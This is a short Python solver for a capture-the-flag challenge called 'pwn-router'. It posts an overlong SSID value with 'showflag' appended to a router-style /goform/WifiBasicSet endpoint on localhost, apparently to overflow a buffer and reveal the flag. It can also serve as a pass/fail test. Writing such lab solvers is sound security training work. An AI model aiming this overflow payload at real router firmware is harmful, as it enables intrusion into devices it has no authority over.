#!/usr/bin/env python3
import argparse
import sys
import urllib.parse
import urllib.request


def main():
    parser = argparse.ArgumentParser(description="Exploit the pwn-router challenge")
    parser.add_argument("--host", default="127.0.0.1", help="target host")
    parser.add_argument("--port", type=int, default=8080, help="target port")
    parser.add_argument(
        "--expect",
        default="",
        help="fail if the response does not contain this string",
    )
    args = parser.parse_args()

    url = f"http://{args.host}:{args.port}/goform/WifiBasicSet"
    payload = urllib.parse.urlencode(
        {
            "ssid": "A" * 64 + "showflag",
            "channel": "11",
            "password": "12345678",
        }
    ).encode()
    request = urllib.request.Request(
        url,
        data=payload,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        method="POST",
    )

    with urllib.request.urlopen(request, timeout=5) as response:
        body = response.read().decode()

    print(body)

    if args.expect and args.expect not in body:
        print(f"expected substring not found: {args.expect}", file=sys.stderr)
        raise SystemExit(1)


if __name__ == "__main__":
    main()
